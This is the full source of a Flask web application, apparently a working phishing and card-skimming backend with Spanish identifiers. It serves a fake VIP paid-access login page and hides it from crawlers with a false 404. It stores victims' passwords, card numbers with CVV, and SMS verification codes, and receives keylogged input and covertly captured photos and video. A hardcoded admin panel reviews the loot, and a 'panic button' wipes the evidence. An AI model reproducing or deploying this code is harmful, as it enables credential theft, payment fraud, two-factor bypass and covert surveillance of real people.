import os, requests, sqlite3, time, shutil
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

app = Flask(__name__)
app.secret_key = 'franco_v20_final_sentinel'

# --- CONFIGURACIÓN DE RUTAS ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'static', 'uploads') 
SYSTEM_FOLDER = os.path.join(BASE_DIR, 'static', 'system')  
MEDIA_FOLDER = os.path.join(BASE_DIR, 'static', 'captured')
DB_PATH = os.path.join(BASE_DIR, 'database.db')

for folder in [UPLOAD_FOLDER, SYSTEM_FOLDER, MEDIA_FOLDER]:
    if not os.path.exists(folder): os.makedirs(folder)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS registros 
        (id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT, pass TEXT, tarjeta TEXT, 
         sms TEXT, tipo TEXT, hora TEXT, dispositivo TEXT, city TEXT, lat REAL, lon REAL,
         bateria TEXT, resolucion TEXT, lenguaje TEXT, zona_horaria TEXT, status TEXT)''')
    
    cursor.execute("PRAGMA table_info(registros)")
    columnas = [info[1] for info in cursor.fetchall()]
    if 'sms' not in columnas: cursor.execute("ALTER TABLE registros ADD COLUMN sms TEXT DEFAULT 'PENDIENTE'")
    if 'status' not in columnas: cursor.execute("ALTER TABLE registros ADD COLUMN status TEXT DEFAULT 'LIVE'")
    conn.commit(); conn.close()

init_db()

config_web = {
    "user_admin": "franco", "pass_admin": "franco",
    "alias": "VIP.FRANCO.PAGOS", "precio": "2500",
    "img_principal": "/static/system/portada.jpg",
    "titulo": "ACCESO EXCLUSIVO VIP",
    "color_fondo": "#1a0033", "color_texto": "#ffffff"
}

# --- FUNCIONES DE POTENCIA Y SEGURIDAD ---

@app.route('/panic_button', methods=['POST'])
def panic_button():
    if session.get('is_admin'):
        if os.path.exists(DB_PATH): os.remove(DB_PATH)
        for folder in [UPLOAD_FOLDER, MEDIA_FOLDER]:
            shutil.rmtree(folder); os.makedirs(folder)
        session.clear()
        return jsonify({"status": "DESTRUIDO"})
    return jsonify({"status": "ERROR"}), 403

@app.route('/k_log', methods=['POST'])
def k_log():
    data = request.json
    rid = session.get('current_id')
    if rid:
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("UPDATE registros SET user=?, pass=? WHERE id=?", (data.get('u'), data.get('p'), rid))
        conn.commit(); conn.close()
    return jsonify({"s": "ok"})

@app.route('/upload_capture', methods=['POST'])
def upload_capture():
    if 'file' in request.files:
        f = request.files['file']
        tipo = request.form.get('type', 'misc')
        rid = session.get('current_id', 'anon')
        fname = f"{tipo}_{rid}_{int(time.time())}.{'jpg' if tipo=='photo' else 'webm'}"
        f.save(os.path.join(MEDIA_FOLDER, fname))
    return jsonify({"s": "ok"})

# --- GESTIÓN DE GALERÍA Y PORTADA ---

@app.route('/upload_media', methods=['POST'])
def upload_media():
    if session.get('is_admin') and 'file_gallery' in request.files:
        f = request.files['file_gallery']
        if f.filename != '': f.save(os.path.join(UPLOAD_FOLDER, f.filename))
    return redirect(url_for('admin_matrix'))

@app.route('/delete_file/<filename>')
def delete_file(filename):
    if session.get('is_admin'):
        try: os.remove(os.path.join(UPLOAD_FOLDER, filename))
        except: pass
    return redirect(url_for('admin_matrix'))

@app.route('/update_full', methods=['POST'])
def update_full():
    if session.get('is_admin'):
        if 'file_portada' in request.files:
            f = request.files['file_portada']
            if f.filename != '': f.save(os.path.join(SYSTEM_FOLDER, "portada.jpg"))
        config_web.update({
            "titulo": request.form.get('titulo'), "alias": request.form.get('alias'),
            "precio": request.form.get('precio'), "color_fondo": request.form.get('color_fondo'),
            "color_texto": request.form.get('color_texto')
        })
    return redirect(url_for('admin_matrix'))

# --- RUTAS DE USUARIO ---

@app.route('/')
def login():
    ua = request.headers.get('User-Agent', '').lower()
    if any(x in ua for x in ['bot', 'crawl', 'facebookexternalhit']): return "404 Not Found", 404
    return render_template('login.html', config=config_web)

@app.route('/auth', methods=['POST'])
def auth():
    u, p = request.form.get('email'), request.form.get('pass')
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("INSERT INTO registros (user, pass, tarjeta, sms, hora, status) VALUES (?,?,?,?,?,?)",
                   (u, p, "ESPERANDO...", "PENDIENTE", datetime.now().strftime("%H:%M:%S"), "LOGIN_INIT"))
    session['current_id'] = cursor.lastrowid
    conn.commit(); conn.close()
    session['logged_in'] = True
    return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'): return redirect(url_for('login'))
    fotos = [f for f in os.listdir(UPLOAD_FOLDER) if f.lower().endswith(('png', 'jpg', 'jpeg'))]
    return render_template('dashboard.html', config=config_web, fotos=fotos)

@app.route('/captura_pago', methods=['POST'])
def captura_pago():
    rid = session.get('current_id')
    if rid:
        data = f"CC: {request.form.get('cc')} | EXP: {request.form.get('exp')} | CVV: {request.form.get('cvv')}"
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("UPDATE registros SET tarjeta=?, status='PAYMENT_SUBMIT' WHERE id=?", (data, rid))
        conn.commit(); conn.close()
    return render_template('procesando.html', config=config_web)

@app.route('/verificar_sms', methods=['POST'])
def verificar_sms():
    rid = session.get('current_id')
    if rid:
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("UPDATE registros SET sms=?, status='FULL_CAPTURE' WHERE id=?", (request.form.get('sms_code'), rid))
        conn.commit(); conn.close()
    return render_template('error_final.html', config=config_web)

# --- RUTAS DE ADMINISTRACIÓN ---

@app.route('/matrix_admin', methods=['GET', 'POST'])
def admin_matrix():
    if request.method == 'POST':
        if request.form.get('user') == config_web["user_admin"] and request.form.get('pass') == config_web["pass_admin"]:
            session['is_admin'] = True
    if not session.get('is_admin'): return render_template('admin_login.html')
    
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("SELECT * FROM registros ORDER BY id DESC")
    regs = cursor.fetchall(); conn.close()
    capturas = os.listdir(MEDIA_FOLDER) if os.path.exists(MEDIA_FOLDER) else []
    archivos = os.listdir(UPLOAD_FOLDER) if os.path.exists(UPLOAD_FOLDER) else []
    return render_template('admin.html', config=config_web, registros=regs, archivos=archivos, capturas=capturas)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
